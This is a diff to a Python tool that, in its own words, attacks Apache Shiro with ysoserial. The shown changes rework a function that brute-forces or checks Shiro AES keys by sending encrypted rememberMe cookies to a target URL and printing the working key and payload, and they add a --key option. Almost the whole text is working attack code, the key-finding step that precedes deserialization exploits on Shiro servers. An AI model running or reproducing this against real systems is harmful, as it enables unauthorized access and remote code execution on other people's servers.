@@ -57,20 +57,18 @@ def check_shiro():
             print("[!] The Shiro framework may not exist for the target,maybe you can add '-d' argument and try again")
             exit()
 
-def brute_key(url, type, data=None, key=None):
+def brute_key(url, type, key,data=None):
     res_length = check_shiro()
     try:
-        with open(os.path.join(sys.path[0], './lib/shiro_keys.txt'),'r') as fr:
-            keys = fr.read().splitlines()
-
-        for key in keys:
+        if key != None:
+            print("[*] Start checking the shiro key : {}".format(key))
             if type == 'CBC':
-                payload = CBCEncrypt(key,base64.b64decode(CHECK_DATA)).decode()
+                payload = CBCEncrypt(key, base64.b64decode(CHECK_DATA)).decode()
 
             if type == 'GCM':
-                payload = GCMEncrypt(key,base64.b64decode(CHECK_DATA)).decode()
+                payload = GCMEncrypt(key, base64.b64decode(CHECK_DATA)).decode()
 
-            if data != "":
+            if data != None:
                 r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
                                     verify=False, headers=HEADER, allow_redirects=False,data=data)
                 rsp = len(str(r.headers))
@@ -83,9 +81,36 @@ def brute_key(url, type, data=None, key=None):
                 print("[*] The correct key : {0}".format(key))
                 print("[*] The payload : {0}".format(payload))
                 exit()
-
+            else:
+                print("[!] The shiro key you specified is incorrect!")
+                return False
         else:
-            return False
+            print("[*] You didn't specify a shiro key. Start blasting mode!")
+            with open(os.path.join(sys.path[0], './lib/shiro_keys.txt'),'r') as fr:
+                keys = fr.read().splitlines()
+
+            for i in range(0, len(keys)):
+                if type == 'CBC':
+                    payload = CBCEncrypt(keys[i],base64.b64decode(CHECK_DATA)).decode()
+
+                if type == 'GCM':
+                    payload = GCMEncrypt(keys[i],base64.b64decode(CHECK_DATA)).decode()
+
+                if data != None:
+                    r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
+                                        verify=False, headers=HEADER, allow_redirects=False,data=data)
+                    rsp = len(str(r.headers))
+                else:
+                    r = requests.get(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
+                                        verify=False, headers=HEADER,allow_redirects=False)
+                    rsp = len(str(r.headers))
+
+                if res_length != rsp and r.status_code != 400:
+                    print("[*] The correct key : {0}".format(keys[i]))
+                    print("[*] The payload : {0}".format(payload))
+                    exit()
+            else:
+                return False
 
     except Exception as e:
         print(e)
@@ -119,12 +144,11 @@ if __name__ == '__main__':
 
     '''
     parser = argparse.ArgumentParser(description="This is a simple tool to attack shiro with ysoserial")
-    parser.add_argument('--mode', '-m', type=str, help='brute/yso/echo/encode', required=True)
-    parser.add_argument('--type', '-t', type=str, help='Cipher type, gcm or cbc', default="CBC")
-    parser.add_argument('--url', '-u', type=str , help='Target URL Address')
-    parser.add_argument('--data', '-d', type=str , help='Using this parameter will initiate an HTTP request using the post method')
-    
-    # parser.add_argument('--key','-k', type=str , default=DEFAULT_SHIRO_KEY,help='Specific a key or the default key will be used')
+    parser.add_argument('--mode', '-m', type=str, metavar='', required=True, help='brute/yso/echo/encode')
+    parser.add_argument('--url', '-u', type=str, metavar='', required=True, help='Target URL Address')
+    parser.add_argument('--type', '-t', type=str, metavar='', default="CBC", help='Cipher type, gcm or cbc')
+    parser.add_argument('--data', '-d', type=str, metavar='', help='Using this parameter will initiate an HTTP request using the post method')
+    parser.add_argument('--key', '-k', type=str, metavar='', help='Specify a shiro key or will use dictionary brute force cracking')
     
     # parser.add_argument('--gadget','-g', type=str ,help='')
     # parser.add_argument('--command','-c', type=str ,help='Specific Execute Command')
@@ -135,31 +159,35 @@ if __name__ == '__main__':
     url  = args.url
     type = str.upper(args.type)
     data = args.data
+    key  = args.key
 
     if mode not in ['brute', 'yso', 'echo', 'encode']:
         print("[!] Please check the mode,it must be brute/yso/echo/encode")
+        exit()
+
+    if url == None:
+        print("[!] Please specify the target URL!")
         exit()
 
     if type!= None and type not in ['GCM', 'CBC']:
         print("[!] Please check the type,it must be GCM or CBC")
         exit()
 
-    if mode == "brute" and url == None:
-        print("[!] Please specify the target URL!")
-        exit()
-
-    if mode == "brute" and url and type=="CBC":
+    if mode == "brute" and type == "CBC":
         print("[*] your mode : {0}".format(mode))
         print("[*] Your url url : {0}".format(url))
         print("[*] Your Cipher type : {0}".format(type))
-        if brute_key(url, type, data) == False:
-            print("[!] The current chiper type is CBC,you can add the '- t GCM' argument and run again")
+        if brute_key(url, type, key,data=None) == False:
+            print("[!] The current chiper type is CBC,maybe you can add the '- t GCM' argument and run again")
             exit()
 
-    if mode == "brute" and url and type=="GCM":
-        print("[*] your mode : {}".format(mode))
+    if mode == "brute" and type == "GCM":
+        print("[*] your mode : {0}".format(mode))
         print("[*] Your url url : {0}".format(url))
         print("[*] Your Cipher type : {0}".format(type))
-        if brute_key(url, type, data) == False:
-            print("[!] The current chiper type is GCM,you can add the '- t CBC' argument and run again")
+        if brute_key(url, type, key,data=None) == False:
+            print("[!] The current chiper type is GCM,maybe you can add the '- t CBC' argument and run again")
             exit()
+
+    # if mode == "brute" and key != None:
+    #     print("[*] Start checking the shiro key : {}".format(key))
